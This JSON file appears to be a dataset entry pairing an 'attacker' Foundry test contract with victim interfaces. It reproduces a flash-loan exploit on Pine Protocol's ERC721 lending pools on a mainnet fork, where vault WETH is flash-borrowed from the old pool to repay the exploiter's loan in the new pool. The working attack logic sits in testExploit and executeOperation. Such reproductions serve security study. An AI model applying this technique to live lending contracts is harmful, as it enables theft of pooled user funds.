[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(address _reserve, uint256 _amount, uint256 _fee, bytes memory _params) external {\n        vm.startPrank(address(this), pineExploiter);\n        WETH.approve(address(ERC721LendingPool02New), type(uint256).max);\n        console.log(\"2. Using flashloaned WETH amount from old lending pool to repay loan in new lending pool\");\n        ERC721LendingPool02New.repay(collateralTokenId, _amount, address(0));\n        // Exploiter send to attack contract additional 0.3 WETH to repay the flashloan in the old pool\n        deal(address(WETH), address(this), WETH.balanceOf(address(this)) + 0.3 ether);\n        console.log(\"3. Repaying flashloan by transferring WETH straight to the Vault\");\n        uint256 amountToTransfer = _amount - WETH.balanceOf(pineGnosisSafe);\n        WETH.transfer(pineGnosisSafe, amountToTransfer);\n        vm.stopPrank();\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 18_835_344);\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(ERC721LendingPool02Old), \"ERC721LendingPool02Old\");\n        vm.label(address(ERC721LendingPool02New), \"ERC721LendingPool02New\");\n        vm.label(address(PPG), \"PPG\");\n        vm.label(address(pineGnosisSafe), \"pineGnosisSafe\");\n        vm.label(address(pineExploiter), \"pineExploiter\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\n            \"[Before loan repay] Vault WETH balance after borrowing ~4 WETH to exploiter\",\n            WETH.balanceOf(pineGnosisSafe),\n            18\n        );\n        emit log_named_address(\n            \"[Before loan repay] Owner of PPG NFT id 3_324 used by exploiter as loan collateral\",\n            PPG.ownerOf(collateralTokenId)\n        );\n        (,,,, uint256 borrowedWei,,,, address borrower) = ERC721LendingPool02New._loans(collateralTokenId);\n\n        console.log(\n            \"[Before loan repay] Status of the exploiter's loan in the new lending pool - Borrowed wei: %s, Borrower: %s\",\n            borrowedWei,\n            borrower\n        );\n        console.log(\"---Exploit start---\");\n        console.log(\"1. Taking flashloan from the old lending pool\");\n        bytes memory params = abi.encode(collateralTokenId, address(ERC721LendingPool02New), pineGnosisSafe);\n        vm.prank(address(this), pineExploiter);\n        ERC721LendingPool02Old.flashLoan(address(this), address(WETH), WETH.balanceOf(pineGnosisSafe), params);\n        console.log(\"---Exploit end---\");\n        emit log_named_decimal_uint(\n            \"[After loan repay] Vault WETH balance (nothing has changed and exploiter successfully repayed his ~4 WETH loan)\",\n            WETH.balanceOf(pineGnosisSafe),\n            18\n        );\n        emit log_named_address(\n            \"[After loan repay] Owner of PPG NFT id 3_324 used by exploiter as loan collateral\",\n            PPG.ownerOf(collateralTokenId)\n        );\n        (,,,, borrowedWei,,,, borrower) = ERC721LendingPool02New._loans(collateralTokenId);\n\n        console.log(\n            \"[After loan repay] Status of the exploiter's loan in the new lending pool - Borrowed wei: %s, Borrower: %s\",\n            borrowedWei,\n            borrower\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IERC721LendingPool",
    "source_type": "victim_contract",
    "function_name": "_loans",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IERC721LendingPool",
    "source_type": "victim_contract",
    "function_name": "flashLoan",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IERC721LendingPool",
    "source_type": "victim_contract",
    "function_name": "repay",
    "original_code": "",
    "description": ""
  }
]